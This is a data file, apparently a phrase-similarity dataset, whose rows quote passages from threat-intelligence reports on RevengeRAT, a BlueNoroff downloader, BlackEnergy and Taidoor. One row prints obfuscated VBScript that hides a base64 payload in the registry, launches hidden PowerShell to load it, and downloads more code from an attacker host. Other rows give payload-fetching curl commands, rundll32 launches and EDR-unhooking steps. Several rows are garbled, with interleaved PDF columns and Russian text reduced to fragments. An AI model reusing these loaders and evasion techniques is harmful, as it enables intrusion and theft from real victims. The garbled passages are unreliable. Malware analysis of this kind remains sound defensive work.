hash|phrase|similarity|adjacent_sentences
12239544,42477388,20785458,18857281,8261830,49362922,10181278,31091323,6121576,1346399,10057624,377576,12543106,1927242,2191306,14104549,29727828,12286001,1778191,4845708,38388171,935452,25785369,18903240,42358606,51988145,52283984,58467981,13615350,20413438,4171892,58550075,14115038,17018631,50112140,8343534,10440235,4535310,12110763,7615092,3010340,5316228,50223822,2333171,6010487,33570936,68917954,4425146,72009198,7664541,14312252,78484231,4557630,3395891,54766789,31886290,2974092,52705260,35235424,2641287,19091519,7788124,10760342,87854102,4847410,4197627,11135143,11438663,25472574,4967208,6781277,1095627,4698184,28663919,3472034,14481640,30514254,9111523,1741751,51788896,1042346,11531143,18925185,9443577,3093273,15517028,25482190,18245040,10020186,938707,11518305,27846473,22777158,23694175,24940311,10947772,25767089,22979805,24315324,16234985,7168670,47402058,5005203,20075109,6788277,6925046,712772,14527039,40768824,75140205,3280464,9859215,7172064,1968579,6158509,139142,31261817,717401,11609582,19398886,15566461,49825073,23208476,292654,67564384,20901718,1408353,11133519|rundll32.exe|1.0|"[']com shormanz[.', ']com verofes[.', ']com : 2/3rundll32 C:\\\\Windows\\\\Tasks\\\\pe.dll,DllRegisterServer C:\\\\Windows\\\\Tasks\\\\pe.dll : 1.', '(EXCEL.EXE, WINWORD.EXE )    (, rundll32.exe, wscript.exe  ).', ""2.       '"", 'rundll32.exe.', ': 3/3']"
509948,5809941,1017079,7711063,6178696,7829423,6157814,8071956,7770437,20234854,21401442,17030870,254018,2286612,10297826,2733522,5246885,28154770,6187452,6638582,1887686,7665015,2430239,15103777,7742133,4170623,10281903,18140653,13946900,9811063,3581463,8520500,5909220,3631305,6913725,4977223,5447653,185762,2867294,8780955,1678590,8048436,2382915,6039464,1773387,5564078,140586,2393782,8618214,11397020,1390237,21985517,10246386,8299052,3242583,557991,5114919,395549,8783489,9000818,596171,11760451,1273891,9312391,9330235,8451394,10866510,12512447,15611278,8148369,7546726,221891,4291264,6787830,1417284,4596933,7410513,1715290,1008115,430228,5100988,99339,2233438,7151829,8841244,18386015,7964644,2738404,6346710,8431395,9736725,2933573,8702321,3492989,315309,5229812,10489638,14306,10480718,9350717,2314554,2402448,8485386,3264235,3717721,2904225,6762919,12989429,4904426,4752265,8198026,24600815,1754978,2387170,3875981,10598210,8909661,2059610,694672,5691197,10640145,4486184,2420871,4241466,333147,2653206,6416480,258935|rundll32.exe|1.0|"['Home page of the Blogger drop urlBut a deeper inspection of its source code reveals an interesting snippet inserted into an invisible blog post: this ghost article contains VBScript code.Figure 4.', ""Visual Basic Script hidden behind the web pageIts funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities:'Update---------------------------------------------------------------------------------------------' Copyright: Microsoft Corp.'' This script is designed to be used only for scheduled tasks(s).'"", ""There is no extensive error check, and will not dump the output from the Powershell CmdLet.''"", 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)}These comments are in fact part of the SyncAppvPublishingServerutility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions:Store a base64 encoded version of the RevengeRAT payload into registry key located at""HKCU\\\\AppEvents\\\\Values""CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ""Decode and execute of the stored payloadSet A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get-ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);""  A0102030405.run CDT0908087CDT, vbHideCreate and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs,capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']brSet XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t(""""[af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs  &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHideFinally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
2680518,651610,3084460,984460,2049164,483514,4555,1234171,487509,1816085,505130,1170561,217070,2286612,492091,2109561,1847006,40860,1016258,1790138,1009184,2040703,1611909,2037959,1231017,47442,3048652,321192,1633432,501391,670902,322877,169664,683840,1417254,1013312,151512,398824,490467,3056964,409199,4481724,1223536,2211224,1101524,2059769,1272754,139257,735975,104738,269579,9822,344909,592389,1646724,557991,259355,73112,589136,1072244,682443,1890947,2644140,429389,2940045,251505,840075,156889,186060,1380625,2199778,260099,1006032,659727,275740,102210,192943,2450877,456615,1207681,2957480,848601,1505480,328492,794782,2804584,301210,5350297,24933,2497436,1412143,1244586,4883,2563028,315309,1632788,1073040,520721,168149,193765,346761,1746134,276700,818151,1986886,693167,219485,1382286,979947,1023917,1984453,326383,1142502,2361924,2248791,172875,638410,216639,35307,73591,164396,1975906,90216,126742,333147,570235,1731439,3925298|rundll32.exe|1.0|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat  DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs    2019      Positive Technologies (PT Expert Security Center, PT ESC)   ,      -  .', '.', '2020           .', ',    ,           .', '2021 PT Expert Security Center    .', '.', '.']
2188583,5809941,6486315,2564278,3312751,3677680,4801307,14977271,733173,3101856,1538528,1616244,1552498,3615923,23935045,4605955,3250705,8106186,5046864,3007706,5424056,332501,7966829,6228454,1547792,743433,4877262,3298604,3147088,1766680,3137816,804298,5909220,13702993,450747,854466,1845578,904925,20691416,1341852,3331295,1668431,1640568,151309,2580179,4019642,756601,1300803,27536710,4858871,114528,863188,1878297,3999563,1746516,1166550,17674339,395549,10214270,2584839,1235269,4347382,774319,1423295,4493461,6149,9156249,7011359,433606,1346686,3589023,760480,4618377,336618,2502913,7154127,3871517,584726,1008115,161432,5100988,99339,188841,3459705,3718174,181121,5128519,2738404,2396794,1450932,328965,2933573,10146082,5804736,3668424,656317,887187,3876892,1255062,4576409,526199,762471,6347750,2992669,7163253,1145344,626106,2577731,1774901,95211,8198026,1185416,1250663,962275,4775312,3761420,4280831,7852742,4634206,4317478,2789300,270823,1978795,579733,333147,1832243,1683940,3188038|downloader contains an encrypted configuration at the end of the file.|0.8533154577798582|['Upon launch, it copies the D ump.bin file to the % Templates%\\\\war[current time][random value].bin (i.e., war166812964324445.bin).', 'The Dump.bin has a modified PE header.', 'The malware reads the first byte of Dump.bin, 0xAF in this file, and decodes 0x3E8 bytes with that key.', 'The decrypted data is the header of a PE file, overwriting the recovered header to the original file.', 'Eventually, it loads the decrypted DLL file by spawning the ordinary first export function.', 'The spawned downloader contains an encrypted configuration at the end of the file.', 'The malware first acquires the total size of the configuration data and the length of the payload URL from the end of the file.', 'They are located four bytes and eight bytes from the end of the file, respectively.', 'The malware decrypts the configuration data with the RC4 algorithm using an embedded 64-byte key.', 'RC4 key: 46 61 44 6D 38 43 74 42 48 37 57 36 36 30 77 6C 62 74 70 79 57 67 34 6A 79 4C 46 62 67 52 33 49 76 52 77 36 45 64 46 38 49 47 36 36 37 64 30 54 45 69 6D 7A 54 69 5A 36 61 42 74 65 69 67 50 33 Restored URL: hxxps://docs.azure- protection[.', ']cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D Structure of configuration In the case of another downloader, however, the payload URL was delivered using a command line parameter.']
2580654,4405238,1017079,453750,2003845,11245,2508908,2201648,9565768,645411,1538528,6234330,3558383,12265261,1370328,4605955,3055130,304913,2376874,2125841,1887686,13945903,7966829,548401,99582,3571107,1324353,1682619,998259,6471844,928165,1452202,4757817,528225,6198585,4153418,1495963,2638487,17080176,7728295,5403292,556136,4528959,1120881,124016,161877,140586,219052,3462751,7207980,101233,3210949,701711,9432060,358757,478131,1974420,3018058,11163758,2170590,1235269,9352180,1273891,8281603,745699,5748040,2235822,1558710,1169998,193085,1376790,1271278,4760458,1839938,7370351,539955,5715600,3213371,1205701,1081391,5100988,99339,1530477,2396059,4232796,2319043,66242,3195577,2396794,1450932,5684720,2817387,7802395,10578224,315309,5229812,161043,282804,895475,1190280,4831279,6227883,1613641,28107,5363608,1543963,751071,198130,4904426,3739681,4650307,2688546,1957091,7233443,3577307,226901,221657,4086786,1588375,989728,2789300,736384,688858,4241466,333147,1226629,2992400,3422830|an encrypted decoy document|0.7919037621839915|['Figure 1: BlackEnergy Builder from 2007The convergence of crimeware and APT attacks BLACKENERGY & QUEDAGH 3 The original BlackEnergy toolkit first emerged in 2007 and Some earlier installer variants, then named regedt32.', 'is referred to in this paper as BlackEnergy 1.', 'A later variant exe, were distributed by documents exploiting software of the toolkit (BlackEnergy 2) was released in 2010.', 'We also vulnerabilities, one of which was CVE-2010-3333.', 'These encountered a previously unseen variant, which had been documents drop and execute the installer, then open a rewritten and uses a different format for its configuration.', 'decoy document.', 'It is reasonable to assume that a similar It also no longer uses a driver component.', 'We dubbed this approach has been used to deliver the more recent new variant BlackEnergy 3. installer variants.', 'The installer filename of BlackEnergy 3 is still msiexec.exe.', 'INFECTION VECTORS However, it is delivered and executed by a dropper which Most of the recent BlackEnergy installers collected are opens a decoy document in the foreground.', 'We also named msiexec.exe.']
2580654,2102506,3161816,3342597,157109,4066506,1121847,7438609,5863279,3405771,1538528,1616244,3183692,7392088,7507939,4605955,2059713,304913,2376874,121946,2411174,1044176,5269532,6185677,4836413,1634285,1324353,3767111,3665080,9811063,1826161,45156,5122576,3345264,6198585,9535753,1845578,2362921,161279,399386,3017260,1618351,3428830,1120881,7771911,5564078,897695,1149272,61146,2414303,469302,4965337,2031412,7502176,358757,557991,7851522,395549,4241899,2170590,1235269,11270034,5348955,2738132,6350521,8767110,5086749,3205541,1169998,193085,3837077,757908,791932,274259,1740818,539955,2012351,1715290,389031,1081391,5100988,629887,224425,5951189,4223134,4613699,2451289,1867865,8116567,5780008,328965,2949253,8116193,3451494,315309,78073,1851798,4719117,2427952,3962925,13217,9498304,1537528,1199104,1825952,1543963,397439,2462271,710043,914881,4756301,1185416,431330,6832828,3875981,162911,4822145,1529333,3820661,45258,5254545,514133,1622103,4241466,333147,1528994,663968,1083979|an encrypted decoy document|0.9483522105030202|['To successfully exploit a vulnerability, the shellcode is first decrypted.', 'It then searches for the The majority of the Taidoor malware samples we have filehandle of the exploit document by comparing the file seen in the wild were delivered via email.', 'We also saw sizes of enumerated handles to a hardcoded file size considerable variations among the email and IP that is supposed to be that of the exploit document.', 'addresses the senders used.', 'Once the handle is found, two buffers are read from the We listed down some of the emails that were sent via an exploit document, which contains the encrypted payload IP address that also served as a C&C server below.', 'This and an encrypted decoy document.', 'was one of the IP addresses that some compromised systems accessed.', 'While we do not exactly know how The payload is then decrypted and saved as a file in the the compromises occurred, we can, based on the Windows temporary directory.', 'The payload is then attackers method of operation, determine which email commonly executed using the WinExec application was the most likely attack vector.', 'programming interface (API).', 'Sample email 18 After the payload is executed, the decoy document is  From: minaki.yang@yahoo.com decrypted and also saved in the Windows temporary  Subject: US-TAIWAN directory.']
2188583,5809941,6486315,2564278,3312751,3677680,4801307,14977271,733173,3101856,1538528,1616244,1552498,3615923,23935045,4605955,3250705,8106186,5046864,3007706,5424056,332501,7966829,6228454,1547792,743433,4877262,3298604,3147088,1766680,3137816,804298,5909220,13702993,450747,854466,1845578,904925,20691416,1341852,3331295,1668431,1640568,151309,2580179,4019642,756601,1300803,27536710,4858871,114528,863188,1878297,3999563,1746516,1166550,17674339,395549,10214270,2584839,1235269,4347382,774319,1423295,4493461,6149,9156249,7011359,433606,1346686,3589023,760480,4618377,336618,2502913,7154127,3871517,584726,1008115,161432,5100988,99339,188841,3459705,3718174,181121,5128519,2738404,2396794,1450932,328965,2933573,10146082,5804736,3668424,656317,887187,3876892,1255062,4576409,526199,762471,6347750,2992669,7163253,1145344,626106,2577731,1774901,95211,8198026,1185416,1250663,962275,4775312,3761420,4280831,7852742,4634206,4317478,2789300,270823,1978795,579733,333147,1832243,1683940,3188038|The PDF and executable files have numerous spaces before the file extension to hide it and allay suspicions.|1.0|"['When the user clicks the link, it executes the 1.vbs file through the WScript process.', 'When we checked the VBS file, it only generated an ok message, which suggests BlueNoroff is still experimenting with this method.', '<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?> <Relationships xmlns=""http://schemas.openxmlformats.org/package/2006/relationships""> 1 <Relationship Id=""rId2"" Type=""http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"" 2 Target=""wscript%201.vbs"" TargetMode=""External""/><Relationship Id=""rId1"" Type=""http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout"" Target=""../slideLayouts/slideLayout1.xml""/></Relationships> Based on our other findings, we discovered an in-the-wild sample (MD5 a17e9fc78706431ffc8b3085380fe29f) from VirusTotal.', 'At the time of analysis, this .vhd sample wasnt detected by any antivirus.', 'The virtual disk file contains a decoy PDF file, Windows executable file, and an encrypted Dump.bin file.', 'The PDF and executable files have numerous spaces before the file extension to hide it and allay suspicions.', '4/12Files inside VHD a file The Job_Description[spaces].exe file (MD5 931d0969654af3f77fc1dab9e2bd66b1) is a loader that loads the next stage payload.', 'Upon launch, it copies the D ump.bin file to the % Templates%\\\\war[current time][random value].bin (i.e., war166812964324445.bin).', 'The Dump.bin has a modified PE header.', 'The malware reads the first byte of Dump.bin, 0xAF in this file, and decodes 0x3E8 bytes with that key.', 'The decrypted data is the header of a PE file, overwriting the recovered header to the original file.']"
2188583,5809941,6486315,2564278,3312751,3677680,4801307,14977271,733173,3101856,1538528,1616244,1552498,3615923,23935045,4605955,3250705,8106186,5046864,3007706,5424056,332501,7966829,6228454,1547792,743433,4877262,3298604,3147088,1766680,3137816,804298,5909220,13702993,450747,854466,1845578,904925,20691416,1341852,3331295,1668431,1640568,151309,2580179,4019642,756601,1300803,27536710,4858871,114528,863188,1878297,3999563,1746516,1166550,17674339,395549,10214270,2584839,1235269,4347382,774319,1423295,4493461,6149,9156249,7011359,433606,1346686,3589023,760480,4618377,336618,2502913,7154127,3871517,584726,1008115,161432,5100988,99339,188841,3459705,3718174,181121,5128519,2738404,2396794,1450932,328965,2933573,10146082,5804736,3668424,656317,887187,3876892,1255062,4576409,526199,762471,6347750,2992669,7163253,1145344,626106,2577731,1774901,95211,8198026,1185416,1250663,962275,4775312,3761420,4280831,7852742,4634206,4317478,2789300,270823,1978795,579733,333147,1832243,1683940,3188038|The malware decrypts the configuration data with the RC4 algorithm using an embedded 64-byte key.|1.0000000000000002|['The decrypted data is the header of a PE file, overwriting the recovered header to the original file.', 'Eventually, it loads the decrypted DLL file by spawning the ordinary first export function.', 'The spawned downloader contains an encrypted configuration at the end of the file.', 'The malware first acquires the total size of the configuration data and the length of the payload URL from the end of the file.', 'They are located four bytes and eight bytes from the end of the file, respectively.', 'The malware decrypts the configuration data with the RC4 algorithm using an embedded 64-byte key.', 'RC4 key: 46 61 44 6D 38 43 74 42 48 37 57 36 36 30 77 6C 62 74 70 79 57 67 34 6A 79 4C 46 62 67 52 33 49 76 52 77 36 45 64 46 38 49 47 36 36 37 64 30 54 45 69 6D 7A 54 69 5A 36 61 42 74 65 69 67 50 33 Restored URL: hxxps://docs.azure- protection[.', ']cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D Structure of configuration In the case of another downloader, however, the payload URL was delivered using a command line parameter.', 'Also, some of the other downloaders (MD5 f766f97eb213d81bf15c02d4681c50a4) have functionality that checks the working environment.', 'If the size of physical memory is less than 2,147,483,648 bytes, the malware terminates execution.', '5/12Infection flow of downloader This downloader checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.']
2188583,5809941,6486315,2564278,3312751,3677680,4801307,14977271,733173,3101856,1538528,1616244,1552498,3615923,23935045,4605955,3250705,8106186,5046864,3007706,5424056,332501,7966829,6228454,1547792,743433,4877262,3298604,3147088,1766680,3137816,804298,5909220,13702993,450747,854466,1845578,904925,20691416,1341852,3331295,1668431,1640568,151309,2580179,4019642,756601,1300803,27536710,4858871,114528,863188,1878297,3999563,1746516,1166550,17674339,395549,10214270,2584839,1235269,4347382,774319,1423295,4493461,6149,9156249,7011359,433606,1346686,3589023,760480,4618377,336618,2502913,7154127,3871517,584726,1008115,161432,5100988,99339,188841,3459705,3718174,181121,5128519,2738404,2396794,1450932,328965,2933573,10146082,5804736,3668424,656317,887187,3876892,1255062,4576409,526199,762471,6347750,2992669,7163253,1145344,626106,2577731,1774901,95211,8198026,1185416,1250663,962275,4775312,3761420,4280831,7852742,4634206,4317478,2789300,270823,1978795,579733,333147,1832243,1683940,3188038|checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender|0.7827483727726834|['The malware decrypts the configuration data with the RC4 algorithm using an embedded 64-byte key.', 'RC4 key: 46 61 44 6D 38 43 74 42 48 37 57 36 36 30 77 6C 62 74 70 79 57 67 34 6A 79 4C 46 62 67 52 33 49 76 52 77 36 45 64 46 38 49 47 36 36 37 64 30 54 45 69 6D 7A 54 69 5A 36 61 42 74 65 69 67 50 33 Restored URL: hxxps://docs.azure- protection[.', ']cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D Structure of configuration In the case of another downloader, however, the payload URL was delivered using a command line parameter.', 'Also, some of the other downloaders (MD5 f766f97eb213d81bf15c02d4681c50a4) have functionality that checks the working environment.', 'If the size of physical memory is less than 2,147,483,648 bytes, the malware terminates execution.', '5/12Infection flow of downloader This downloader checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.', 'If TrendMicro, BitDefender, or Windows Defender products are installed, the malware conducts a classic unhooking DLL trick intended to remove user-mode hooks from the system library.', 'This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address.', 'With this trick, the malware can disable the functionalities of EDR/AV products.', 'Next, the malware creates a mutex to avoid duplicate execution.', 'Mutex name: da9f0e7dc6c52044fa29bea5337b4792b8b873373ba99ad816d5c9f5f275f03f Next, the malware opens a PDF decoy document in the same directory.']
2188583,5809941,6486315,2564278,3312751,3677680,4801307,14977271,733173,3101856,1538528,1616244,1552498,3615923,23935045,4605955,3250705,8106186,5046864,3007706,5424056,332501,7966829,6228454,1547792,743433,4877262,3298604,3147088,1766680,3137816,804298,5909220,13702993,450747,854466,1845578,904925,20691416,1341852,3331295,1668431,1640568,151309,2580179,4019642,756601,1300803,27536710,4858871,114528,863188,1878297,3999563,1746516,1166550,17674339,395549,10214270,2584839,1235269,4347382,774319,1423295,4493461,6149,9156249,7011359,433606,1346686,3589023,760480,4618377,336618,2502913,7154127,3871517,584726,1008115,161432,5100988,99339,188841,3459705,3718174,181121,5128519,2738404,2396794,1450932,328965,2933573,10146082,5804736,3668424,656317,887187,3876892,1255062,4576409,526199,762471,6347750,2992669,7163253,1145344,626106,2577731,1774901,95211,8198026,1185416,1250663,962275,4775312,3761420,4280831,7852742,4634206,4317478,2789300,270823,1978795,579733,333147,1832243,1683940,3188038|the malware can disable the functionalities of EDR/AV products.|0.9018412323124602|['Also, some of the other downloaders (MD5 f766f97eb213d81bf15c02d4681c50a4) have functionality that checks the working environment.', 'If the size of physical memory is less than 2,147,483,648 bytes, the malware terminates execution.', '5/12Infection flow of downloader This downloader checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.', 'If TrendMicro, BitDefender, or Windows Defender products are installed, the malware conducts a classic unhooking DLL trick intended to remove user-mode hooks from the system library.', 'This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address.', 'With this trick, the malware can disable the functionalities of EDR/AV products.', 'Next, the malware creates a mutex to avoid duplicate execution.', 'Mutex name: da9f0e7dc6c52044fa29bea5337b4792b8b873373ba99ad816d5c9f5f275f03f Next, the malware opens a PDF decoy document in the same directory.', 'The decoy document masquerades as a job offer from a Japanese multinational bank.', 'If Windows Defender or Bitdefender Antivirus is installed on the victims computer, the malware executes itself with the following commands: Windows Defender: cmd /c timeout /t 10 & Del /f /q \\\\[current file name]\\\\ & attrib -s -h \\\\[PDF decoy file]\\\\ & rundll32 \\\\[current DLL file path]\\\\ #1 Bitdefender: cmd /c timeout /t 10 & rundll32 \\\\[current DLL file path]\\\\ #1 The primary objective of this malware is to fetch the next stage payload.', 'To do this, the malware uses the cURL library, combining cURL commands depending on the antivirus installed.']
381232,840853,6486315,654442,576615,3677680,4801307,20232614,733173,562405,1538528,1616244,1552498,5077701,191204,4605955,9195829,8106186,5046864,11100931,17088587,9448267,4150090,8851008,1450731,743433,2124664,4458109,3147088,6555506,3901026,804298,5909220,13702993,450747,854466,1845578,904925,1491537,1341852,4231496,1668431,1640568,151309,2580179,4019642,756601,10470287,22327870,4391411,114528,4088183,1878297,4627295,3242583,1166550,5159784,395549,1834844,2584839,1235269,4347382,774319,1423295,4493461,6149,9156249,7011359,433606,1346686,3589023,760480,4618377,336618,5427764,9267928,7073419,584726,1008115,161432,5100988,99339,188841,3459705,4667868,181121,8633307,2738404,2396794,1450932,328965,2933573,10146082,5804736,3668424,656317,2837940,3876892,1255062,4576409,526199,762471,6347750,3953201,15056196,1543963,626106,2577731,1774901,509682,8198026,1185416,1250663,962275,8191612,3761420,8909661,8412121,21631739,10471477,2789300,2485405,1978795,4241466,5101138,1832243,4450784,3188038|the malware can disable the functionalities of EDR/AV products.|0.9018412323124602|"[']cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3DStructure of configurationIn the case of another downloader, however, the payload URL was delivered using a command line parameter.', 'Also, some of the other downloaders (MD5f766f97eb213d81bf15c02d4681c50a4) have functionality that checks the working environment.', 'If the size of physical memory is less than 2,147,483,648 bytes, the malware terminates execution.Infection flow of downloaderThis downloader checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.', 'If TrendMicro, BitDefender, or Windows Defender products are installed, the malware conducts a classicunhooking DLL trickintended to remove user-mode hooks from the system library.', 'This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address.', 'With this trick, the malware can disable the functionalities of EDR/AV products.', 'Next, the malware creates a mutex to avoid duplicate execution.Mutex name: da9f0e7dc6c52044fa29bea5337b4792b8b873373ba99ad816d5c9f5f275f03fNext, the malware opens a PDF decoy document in the same directory.', 'The decoy document masquerades as a job offer from a Japanese multinational bank.If Windows Defender or Bitdefender Antivirus is installed on the victims computer, the malware executes itself with the following commands:Windows Defender:cmd /c timeout /t 10 & Del /f /q \\\\[current file name]\\\\ & attrib -s -h \\\\[PDF decoy file]\\\\ & rundll32 \\\\[current DLL file path]\\\\ #1Bitdefender:cmd /c timeout /t 10 & rundll32 \\\\[current DLL file path]\\\\ #1The primary objective of this malware is to fetch the next stage payload.', 'To do this, the malware uses the cURL library, combining cURL commands depending on the antivirus installed.Avira or Avast installed:curl -A cur1-agent -L [payload URL(| -x proxy URL)] -s -ddaOther cases:curl -A cur1-agent -L [payload URL(| -x proxy URL)] -s -ddlNote that the user-agent name is cur1-agent, and the malware sends da POST data if the victim installed Avira or Avast; otherwise, the malware sends dl POST data.', 'If the fetched data by cURL command contains <html> and curl:, the malware decrypts the payload with a delivered 64-byte RC4 key.If Avira or Avast are installed, the malware saves the decrypted payload to %TEMPLATES%\\\\marcoor.dll and spawns it with the rundll32.exe command with the payload URL.command:exe %TEMPLATES%\\\\marcoor.dll #1 [payload URL]Otherwise, the malware doesnt write the payload to the file and injects the fetched payload into the explorer.exe process.', 'The fetched payload is a DLL type executable and its export function is spawned with the payload URL.Unfortunately, we havent been able to obtain a precise infection chain so far.']"
